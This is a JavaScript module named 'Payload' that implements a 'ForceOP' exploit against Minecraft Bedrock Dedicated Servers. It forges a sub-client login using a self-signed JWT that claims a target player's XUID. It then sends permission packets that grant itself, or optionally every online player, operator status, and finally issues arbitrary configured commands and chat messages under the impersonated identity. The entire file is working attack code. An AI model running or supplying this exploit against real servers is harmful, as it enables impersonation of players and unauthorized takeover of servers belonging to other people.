const JWT = require("jsonwebtoken");
const crypto = require("crypto");
const UUID = require("uuid");
const { createClient } = require("bedrock-protocol");
const { AdventureFlags, CommandOriginType, CommandPermissionLevel, DeviceOS, InputModes, PacketIds, PermissionFlags, PermissionLevel, TextType } = require("./constants.js");
const BinaryStream = require("./BinaryStream.js");
const config = require("../config.json");

class Payload {
	botName = "ImpersonatedUser"
	subclientId = 1;

	/**
	 * @class
	 * @description Connect to a Bedrock Dedicated Server and use the ForceOP exploit with a given player XUID
	 * @param {string} targetXuid - The player XUID to impersonate that will be used to give ourselves operator
	 * @param {string} ip - The IP of the server to connect to
	 * @param {number} port - The port of the server to connect to
	 * @param {boolean} offline - If we should log in as an offline player
	 */
	constructor({ targetXuid, ip, port, offline = false }) {
		this.targetXuid = targetXuid;

		this.client = createClient({
			host: ip,
			port: port,
			profilesFolder: "./authCache/",
			offline: offline,
			// Incase 'offline' is set to true, the offline account will have a username of 'Test'
			username: "Test"
		});

		this.client.on("player_list", (playerList) => this.onPlayerList(playerList));
	}

	packetCount = 0;
	onPlayerList(playerList) {
		// The first PlayerList packet we receive only contains information about our current player, and the second PlayerList packet we receive contains info for all online players
		// If the 'opAll' config value is enabled, we will need to wait for the second PlayerList packet
		this.packetCount++;
		if(this.packetCount !== 2) return;

		console.log("We managed to get the PlayerList packet, we can now start the exploit");

		this.createSubClient();

		console.log("Sent the SubClientLogin packet, we can now give players Operator permissions");

		const records = playerList.records.records;
		for(const player of records) {
			if(!config.opAll && player.username !== this.client.username) continue;

			// In 1.19.10 the AdventureSettings packed was removed and was replaced by RequestPermissions
			if(this.client.versionGreaterThanOrEqualTo("1.19.10")) {
				console.log(`Sending RequestPermissions packet to give ${player.username} Operator`);
				this.sendRequestPermissions(player.entity_unique_id, 4);
			} else {
				console.log(`Sending AdventureSettings packet to give ${player.username} Operator`);
				this.sendAdventureSettings(player.entity_unique_id);
			}
		}

		console.log("Running final actions...");

		for(const command of config.commands) {
			this.sendCommandRequest(command);
		}

		for(const message of config.messages) {
			this.sendText(message);
		}

		setTimeout(() => {
			this.client.disconnect();
		}, 500);
	}

	createSubClient() {
		// https://github.com/PrismarineJS/bedrock-protocol/blob/master/src/handshake/keyExchange.js#L13
		const { privateKey, publicKey } = crypto.generateKeyPairSync("ec", { namedCurve: "secp384r1" });
		const privateKeyPEM = privateKey.export({ format: "pem", type: "sec1" });
		const publicKeyDER = publicKey.export({ format: "der", type: "spki" });
		const clientX509 = publicKeyDER.toString("base64");

		const JWTOptions = {
			algorithm: "ES384",
			noTimestamp: true,
			notBefore: 0,
			// Our self signed JWT we create will only be valid for the next twenty four hours
			expiresIn: 60 * 60 * 24,
			header: {
				x5u: clientX509,
				typ: undefined
			}
		};

		const certificateChain = {
			extraData: {
				XUID: this.targetXuid,
				displayName: this.botName,
				identity: UUID.v4()
			},
			identityPublicKey: clientX509,
		};

		const identity = JWT.sign(certificateChain, privateKeyPEM, JWTOptions);
		const chain = [ identity ];

		const steveSkin = require("minecraft-data")("bedrock_1.19.70").defaultSkin;
		const userChain = {
			...steveSkin,

			ClientRandomId: Date.now(),
			CurrentInputMode: InputModes.MOUSE,
			DefaultInputMode: InputModes.MOUSE,
			DeviceID: UUID.v4(),
			DeviceOS: DeviceOS.WINDOWS_10,
			PlatformOfflineId: "",
			PlatformOnlineId: "",
			PlatformUserId: UUID.v4(),
			PlayFabId: "",
			PrimaryUser: false,
			ThirdPartyName: this.botName,
			ThirdPartyNameOnly: false,
			TrustedSkin: true
		};

		const clientChain = JWT.sign(userChain, privateKeyPEM, JWTOptions);

		const packet = new BinaryStream();
		packet.writeVarInt(this.createPacketId(PacketIds.SUB_CLIENT_LOGIN, 0, this.subclientId));

		const webToken = new BinaryStream();
		webToken.writeLEString(JSON.stringify({ chain }));
		webToken.writeLEString(clientChain);

		packet.writeVarInt(webToken.length);
		packet.writeBuffer(webToken.toBuffer());

		this.client.sendBuffer(packet.toBuffer());
	}

	sendText(message) {
		const packet = new BinaryStream();
		packet.writeVarInt(this.createPacketId(PacketIds.TEXT, 0, this.subclientId));

		packet.writeUInt8(TextType.CHAT); // Chat Type
		packet.writeBool(false); // Needs Translation
		packet.writeVarintString(this.botName); // Username
		packet.writeVarintString(message); // Message
		packet.writeVarintString(this.targetXuid); // XUID
		packet.writeVarintString(""); // Platform Chat ID

		this.client.sendBuffer(packet.toBuffer());
	}

	sendAdventureSettings(uniqueId, permissionLevel = PermissionLevel.OPERATOR) {
		const packet = new BinaryStream();
		packet.writeVarInt(this.createPacketId(PacketIds.ADVENTURE_SETTINGS, 0, this.subclientId));

		// Player Abilities
		// We can also use this to make other players no-clip
		packet.writeVarInt(
			AdventureFlags.AUTO_JUMP
		);
		packet.writeVarInt(CommandPermissionLevel.GAME_MASTER) // CommandPermissionLevel
		packet.writeVarInt(447); // Permissions, unknown
		packet.writeVarInt(permissionLevel); // PlayerPermissionLevel
		packet.writeVarInt(0); // Abilities, unknown
		packet.writeBigInt64LE(uniqueId); // Unique ID

		this.client.sendBuffer(packet.toBuffer());
	}

	sendCommandRequest(command) {
		const packet = new BinaryStream();
		packet.writeVarInt(this.createPacketId(PacketIds.COMMAND_REQUEST, 0, this.subclientId));

		packet.writeVarintString(command); // Command

		// Command Origin
		packet.writeVarInt(CommandOriginType.PLAYER); // Origin Source
		packet.writeUuid(UUID.v4()); // UUID
		packet.writeVarintString(""); // Request ID

		packet.writeBool(false); // Internal

		// The version field in the CommandRequest packet was added in 1.19.60
		if(this.client.versionGreaterThanOrEqualTo("1.19.60")) {
			packet.writeVarInt(66); // Command Engine version
		}

		this.client.sendBuffer(packet.toBuffer());
	}

	sendRequestPermissions(uniqueId, permissionLevel = 4) {
		const packet = new BinaryStream();
		packet.writeVarInt(this.createPacketId(PacketIds.REQUEST_PERMISSIONS, 0, this.subclientId));

		packet.writeBigInt64LE(uniqueId); // Unique ID
		packet.writeVarInt(permissionLevel); // Permission level, values here do not match the values of the PermissionLevel enum
		// Bitfield representation of available abilities
		packet.writeUInt16LE(
			PermissionFlags.BUILD |
			PermissionFlags.MINE |
			PermissionFlags.DOORS_AND_SWITCHES |
			PermissionFlags.OPEN_CONTAINERS |
			PermissionFlags.ATTACK_PLAYERS |
			PermissionFlags.ATTACK_MOBS |
			PermissionFlags.OPERATOR |
			PermissionFlags.TELEPORT
		);

		this.client.sendBuffer(packet.toBuffer());
	}

	createPacketId(packetId, targetId = 0, senderId = 0) {
		return (packetId & 1023) |
			((targetId & 3) << 10) |
			((senderId & 3) << 12);
	}
}

module.exports = Payload;